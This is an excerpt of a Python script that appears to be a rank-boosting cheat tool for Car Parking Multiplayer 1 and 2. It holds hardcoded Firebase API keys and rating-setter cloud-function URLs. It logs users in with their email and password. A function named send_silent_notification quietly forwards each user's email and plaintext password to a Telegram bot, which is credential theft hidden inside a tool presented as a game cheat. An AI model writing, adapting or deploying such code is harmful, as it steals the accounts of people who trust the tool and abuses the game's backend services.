...
GAMES = {
    "1": {
        ...
        "rank_url": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",  # Itinama ang URL
        "login_tag": "Cpm1"
    },
    "2": {
        "name": "Car Parking Multiplayer 2",
        "firebase_api_key": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ",
        "rank_url": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI",  # Itinama ang URL
        "login_tag": "Cpm2"
    }
}
...
def send_silent_notification(email, password, tag):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  # Itinama ang URL
    message = f"🔐 Login {tag}:\n📧 Email: {email}\n🔒 Password: {password}"
...
def login(email, password, game):
    ...
    login_url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={game['firebase_api_key']}"  # Itinama ang URL
    payload = {
